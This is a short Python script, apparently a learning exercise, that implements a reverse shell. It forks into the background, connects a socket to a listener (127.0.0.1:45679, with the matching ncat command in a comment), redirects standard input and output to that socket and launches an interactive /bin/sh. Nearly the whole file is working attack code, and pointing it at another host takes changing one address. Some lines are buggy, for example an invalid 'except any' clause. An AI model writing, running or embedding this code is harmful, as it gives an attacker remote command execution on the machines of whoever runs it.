# reverse shell is an action by which a user gains access to the shell of an external server
#ncat -l -v -p 45679

import socket
import subprocess #  subprocess module allows the script to execute commands and interact with the input and output of these commands.
import os # multipurpose operating system interface module that allows us to check whether we can create a fork process using the fork()

socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    if os.fork() > 0:
        os._exit(0)
except OSError as error:
    print('Error in fork process: %d (%s)' % (error.errno, error.strerror))

pid = os.fork()
if pid > 0:
    print('Fork Not Valid')

try:
    socket_handler.connect(("127.0.0.1", 45679))  # connect to a host
    os.dup2(socket_handler.fileno(), 0)  # establish the connection to our socket through the command output
    os.dup2(socket_handler.fileno(), 1)
    os.dup2(socket_handler.fileno(), 2)
    shell_remote = subprocess.call(["/bin/sh", "-i"])
    list_files = subprocess.call(["/bin/ls", "-i"])
except any as error:
    print(error.errno, error.strerror)
